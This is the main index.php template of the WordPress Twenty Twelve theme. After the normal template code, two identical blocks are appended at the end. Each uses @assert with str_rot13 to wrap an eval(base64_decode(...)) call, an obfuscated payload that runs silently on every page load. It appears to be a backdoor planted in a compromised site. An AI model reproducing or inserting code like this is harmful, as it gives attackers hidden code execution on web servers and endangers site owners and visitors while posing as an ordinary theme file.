<?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * For example, it puts together the home page when no home.php file exists.
 *
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

get_header(); ?>

	<div id="primary" class="site-content">
		<div id="content" role="main">
		<?php if ( have_posts() ) : ?>

			<?php /* Start the Loop */ ?>
			<?php while ( have_posts() ) : the_post(); ?>
				<?php get_template_part( 'content', get_post_format() ); ?>
			<?php endwhile; ?>

			<?php twentytwelve_content_nav( 'nav-below' ); ?>

		<?php else : ?>

			<article id="post-0" class="post no-results not-found">

			<?php if ( current_user_can( 'edit_posts' ) ) :
				// Show a different message to a logged-in user who can add posts.
			?>
				<header class="entry-header">
					<h1 class="entry-title"><?php _e( 'No posts to display', 'twentytwelve' ); ?></h1>
				</header>

				<div class="entry-content">
					<p><?php printf( __( 'Ready to publish your first post? <a href="%s">Get started here</a>.', 'twentytwelve' ), admin_url( 'post-new.php' ) ); ?></p>
				</div><!-- .entry-content -->

			<?php else :
				// Show the default message to everyone else.
			?>
				<header class="entry-header">
					<h1 class="entry-title"><?php _e( 'Nothing Found', 'twentytwelve' ); ?></h1>
				</header>

				<div class="entry-content">
					<p><?php _e( 'Apologies, but no results were found. Perhaps searching will help find a related post.', 'twentytwelve' ); ?></p>
					<?php get_search_form(); ?>
				</div><!-- .entry-content -->
			<?php endif; // end current_user_can() check ?>

			</article><!-- #post-0 -->

		<?php endif; // end have_posts() check ?>

		</div><!-- #content -->
	</div><!-- #primary -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>
<?php 
//###==###
@assert(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGgwqKWfK3AyqT9jqPtxLmRfAQVfMzSfp2HcB2A1pzksp2I0o3O0XPEwZFjkBGxkZlk0paIyXGfxnJW2VQ0tVTA1pzksMKuyLltxLmRcB2A1pzksL2kip2HbWTZkXGg9MJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcCG0kXKfxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbVzu0qUN6Yl9uoTkapzIuqTEyLJDhL29gY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKFxhVvM1CFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKFxhVvMwCFVhWTZjYvVznG0kWzyjCFVhWS9GEIWJEIWoVyWSGH9HEI9OEREFVy0hVvMbCFVhoJD1XPWvBJH5BQVlZQp4BTV1AGZkZzL0AwMxL2IzAGH0BTR4LvVhWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0hWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqYvEwZP4vZFVcXGg9VTyzVPucp3AyqPtxnJW2XFxtrlOyL2uiVPEcLaL7VU0tnJLbnKAmMKDbWS9FEISIEIAHJlWjVy0cVPLzVPEsHxIEIHIGISfvpPWqVQ09VPVkMGIyBGN5AFVcVUftDTSmp2IlqPtxK1WSHIISH1EoVzZvKFx7VU19"));'));
//###==###
?>